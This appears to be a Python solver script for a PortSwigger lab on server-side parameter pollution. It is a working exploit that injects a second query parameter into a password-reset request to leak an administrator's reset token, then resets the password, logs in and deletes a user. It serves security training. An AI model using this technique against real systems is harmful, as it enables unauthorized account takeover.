# Lab 04 — Exploiting server-side parameter pollution in a query string
# PortSwigger: https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string
#
# Vulnerability: The password-reset front-end embeds the username parameter
#                unescaped into an internal API's query string, letting an
#                attacker inject a second 'field' parameter that overrides
#                the front-end's own default
# Aim:           Log in as administrator and delete carlos
#
# Technique:
#   POST /forgot-password  username=administrator
#     → confirms an email reset notice was generated (we don't have the inbox)
#
#   The front-end internally calls something shaped like:
#     GET /api/internal/resetPassword?username=administrator&field=email
#
#   Our username value is embedded UNESCAPED into that internal query string.
#   Injecting "&field=reset_token" as part of OUR username value adds a
#   second 'field' parameter — which, depending on how the internal API
#   parses duplicates, can override the front-end's own "&field=email" and
#   cause the internal API to return the actual reset token instead.
#
#   requests automatically URL-encodes the & and = in our value when we pass
#   it as a normal form field — which is EXACTLY the injection we want:
#   data={"username": "administrator&field=reset_token"}
#   serializes to: username=administrator%26field%3Dreset_token
#
# Usage: python api_testing_lab04.py <url>

import sys
import re
import urllib3
from proxies import proxies
from api_testing_utils import banner, section, make_session, login, get_csrf_from_response, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 04 — SSPP IN A QUERY STRING (PASSWORD RESET TOKEN LEAK)")

    if len(sys.argv) != 2:
        print("  Usage: python api_testing_lab04.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: get a CSRF token from the forgot-password page ──────────────
    print("\n  ── Step 1: fetch /forgot-password and grab its CSRF token\n")
    fp_page = session.get(f"{url}/forgot-password")
    csrf = get_csrf_from_response(fp_page.text)
    if not csrf:
        print("  ✘  Could not find a CSRF token on /forgot-password")
        sys.exit(1)
    print(f"  ✔  CSRF token: {csrf[:16]}...")

    # ── Step 2: baseline request for administrator ───────────────────────────
    print("\n  ── Step 2: baseline POST /forgot-password for administrator\n")
    r_baseline = session.post(
        f"{url}/forgot-password",
        data={"csrf": csrf, "username": "administrator"}
    )
    print_box("Baseline response", r_baseline.text)

    # ── Step 3: inject a second 'field' parameter via the username value ────
    print("  ── Step 3: inject &field=reset_token via the username parameter\n")
    print("  ℹ  Sending data={'username': 'administrator&field=reset_token'}")
    print("     requests URL-encodes this to: username=administrator%26field%3Dreset_token\n")

    r_inject = session.post(
        f"{url}/forgot-password",
        data={"csrf": csrf, "username": "administrator&field=reset_token"}
    )
    print_box("Injection response", r_inject.text)

    # ── Step 4: extract the leaked reset token ────────────────────────────────
    token_match = re.search(r'"result"\s*:\s*"([a-zA-Z0-9]+)"', r_inject.text)
    if not token_match:
        print("  ✘  Could not extract a reset token from the response.")
        print("     The internal API may use different duplicate-parameter")
        print("     handling on this instance — try field= variations manually.")
        sys.exit(1)

    reset_token = token_match.group(1)
    print(f"  ✔  Leaked reset token: {reset_token}\n")

    # ── Step 5: use the token to access the password reset page ─────────────
    print("  ── Step 5: load the password reset page with the leaked token\n")
    r_reset_page = session.get(f"{url}/forgot-password", params={"reset_token": reset_token})
    check_status(r_reset_page, 200, "Load password reset page")

    reset_csrf = get_csrf_from_response(r_reset_page.text)

    # ── Step 6: set a new password for administrator ──────────────────────────
    print("\n  ── Step 6: submit a new password for administrator\n")
    new_password = "PwnedAdmin123!"
    reset_data = {
        "temp-forgot-password-token": reset_token,
        "username": "administrator",
        "new-password-1": new_password,
        "new-password-2": new_password,
    }
    if reset_csrf:
        reset_data["csrf"] = reset_csrf

    r_set_password = session.post(f"{url}/forgot-password", data=reset_data, allow_redirects=True)
    check_status(r_set_password, [200, 302], "Set new administrator password")

    # ── Step 7: log in as administrator and delete carlos ────────────────────
    print("\n  ── Step 7: log in as administrator with the new password\n")
    admin_session = make_session(proxies)
    if not login(admin_session, url, username="administrator", password=new_password):
        print("  ✘  Login failed — inspect the reset flow manually, field names")
        print("     may differ slightly on this lab instance.")
        sys.exit(1)

    print("\n  ── Step 8: delete carlos via the admin panel\n")
    r_delete = admin_session.post(f"{url}/admin/delete", data={"username": "carlos"})
    check_status(r_delete, [200, 302], "Delete carlos")

    print()
    print("  ℹ  The injected '&field=reset_token' became a SECOND parameter in")
    print("     the internal request the front-end built on our behalf — and it")
    print("     won, overriding the front-end's own default 'field=email'.")
